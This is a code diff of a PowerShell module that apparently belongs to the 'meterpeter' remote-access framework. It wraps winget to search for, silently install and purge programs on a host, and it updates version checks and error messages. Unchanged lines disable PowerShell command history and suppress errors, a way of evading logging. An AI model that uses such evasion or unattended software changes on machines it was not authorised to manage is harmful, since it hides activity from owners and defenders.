@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: WinGet, UserLand
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.3
+   PS cmdlet Dev version: v1.0.4
 
 .DESCRIPTION
    Auxiliary Module of meterpeter v2.10.13 that invokes winget command line
@@ -31,11 +31,11 @@
    Delete cmdlet in the end? (default: off)
 
 .Parameter Force
-   Force winget install on local computer!
+   Install winget application on local computer!
 
 .EXAMPLE
    PS C:\> .\Invoke-Winget.ps1 -force
-   Force winget install on local computer!
+   Install winget appl on local computer!
 
 .EXAMPLE
    PS C:\> .\Invoke-Winget.ps1 -action 'list'
@@ -85,7 +85,7 @@
 )
 
 
-$cmdletver = "v1.0.3"
+$cmdletver = "v1.0.4"
 $ErrorActionPreference = "SilentlyContinue"
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
@@ -113,14 +113,14 @@ If(($OsVersion -match '^(10)$') -and ($OsBuild -lt "16299"))
    return
 }
 
-## Make sure Winget is installed
-$CheckInstall = (winget --version)
-If(-not($CheckInstall -match '^(v+\d+\.)'))
+## Make sure Winget application is installed
+$CheckInstall = (Get-Command "winget" -EA SilentlyContinue).Source
+If([string]::IsNullOrEmpty($CheckInstall))
 {
    If($Force.IsPresent)
    {
-      ## Force winget installation on local computer
-      Add-AppxPackage -RegisterByFamilyName -MainPackage Microsoft.DesktopAppInstaller_8wekyb3d8bbwe
+      ## Download and install winget application using the latest release available.
+      Add-AppxPackage https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle
    }
    Else
    {
@@ -161,11 +161,22 @@ If($Action -iMatch '^(discover)$')
    }
 
    ## Search for pacakage in microsoft store
-   winget search --name "$Program" --exact
-   If($? -iMatch 'false')
+   winget search --name "$Program" --exact|Out-File -FilePath "$Env:TMP\skynet.log" -Force
+   $Pacakage = (Get-Content -Path "$Env:TMP\skynet.log"|Select-String -Pattern "$Program")
+   If([string]::IsNullOrEmpty($Pacakage))
    {
-      write-host "   > Error: program '$Program' not found!" -ForegroundColor Red   
+      write-host "   > Error: program '$Program' not found in msstore!`n" -ForegroundColor Red
    }
+   Else
+   {
+      ## Sanitize command output
+      $RawData = (Get-Content -Path "$Env:TMP\skynet.log")
+      $SanitizeOutput = $RawData -replace '(\\|/)',''
+      echo $SanitizeOutput
+   }
+
+   ## Clean Up
+   Remove-Item -Path "$Env:TMP\skynet.log" -Force
 
 }
 
@@ -193,16 +204,16 @@ If($Action -iMatch '^(install)$')
    $IsAvailable = (Winget search --name "$Program" --exact|Select-String -Pattern "$Program")
    If([string]::IsNullOrEmpty($IsAvailable))
    {
-      write-host "   > Error: program '$Program' not found!`n" -ForegroundColor Red
+      write-host "   > Error: program '$Program' not found in msstore!`n" -ForegroundColor Red
       return      
    }
 
    ## Silent install program from microsoft store
    winget install --name "$Program" --id "$Id" --silent --force --accept-package-agreements --accept-source-agreements --disable-interactivity
-   If($? -iMatch 'false')
+   If($? -match 'false')
    {
-      write-host "   > Fail: Installing -program '$Program' -id '$Id'`n" -ForegroundColor Red
-      return
+      write-host "`n   > Fail: Installing -program '$Program' -id '$Id' from msstore`n" -ForegroundColor Red
+      return      
    }
 
 }
@@ -231,15 +242,15 @@ If($Action -iMatch '^(uninstall)$')
    $IsAvailable = (Winget list|Select-String -Pattern "$Program")
    If([string]::IsNullOrEmpty($IsAvailable))
    {
-      write-host "   > Error: program '$Program' not found!`n" -ForegroundColor Red
+      write-host "   > Error: program '$Program' not found [local]!`n" -ForegroundColor Red
       return      
    }
 
    ## Silent Uninstall program from local machine
    winget uninstall --name "$Program" --id "$Id" --silent --force --purge --disable-interactivity
-   If($? -iMatch 'false')
+   If($? -match 'false')
    {
-      write-host "   > Fail: Uninstalling -program '$Program' -id '$Id'`n" -ForegroundColor Red
+      write-host "`n   > Fail: Uninstalling -program '$Program' -id '$Id' [local]`n" -ForegroundColor Red
       return
    }
 
